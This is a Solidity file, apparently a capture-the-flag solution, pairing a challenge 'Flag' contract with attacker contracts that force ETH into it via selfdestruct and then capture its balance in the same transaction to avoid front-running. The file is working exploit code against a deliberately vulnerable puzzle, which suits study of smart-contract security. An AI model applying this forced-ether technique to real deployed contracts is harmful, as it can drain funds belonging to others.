pragma solidity 0.5.3;

contract Flag {
    mapping (address => bool) public captured;

    event LogSneakedUpOn(address indexed who, uint howMuch);
    event LogCaptured(address indexed who, bytes32 braggingRights);

    constructor() public {
    }

    function sneakUpOn() public payable {
        emit LogSneakedUpOn(msg.sender, msg.value);
        msg.sender.transfer(msg.value);
    }

    function capture(bytes32 braggingRights) public {
        require(address(this).balance > 0);
        captured[msg.sender] = true;
        emit LogCaptured(msg.sender, braggingRights);
        msg.sender.transfer(address(this).balance);
    }
}

//Used to trick the Flag contract into receiving ETH.
contract MoneyBag {
    //does nothing, but can store ETH
    constructor() public payable {
        
    }
    
    function killMe() public {
        selfdestruct(0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5);
    }
}

//Used to capture the flag in the same block MoneyBag is burst.
//the spy won't have time to steal my money; no more mwahaha.
contract ForcefulPhilantrope {
    MoneyBag moneyBag;
    Flag flag;
    
    constructor() public payable {
        moneyBag = MoneyBag(0xB95408e89C68BF0F313872093e493ae5E607708e);
        flag = Flag(0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5);
    }
    
    function pwn() public {
        moneyBag.killMe();
        flag.capture("finally!");
    }
    
    function peek() public {
        flag.sneakUpOn();
    }
    
    function() external payable {
        
    }
}
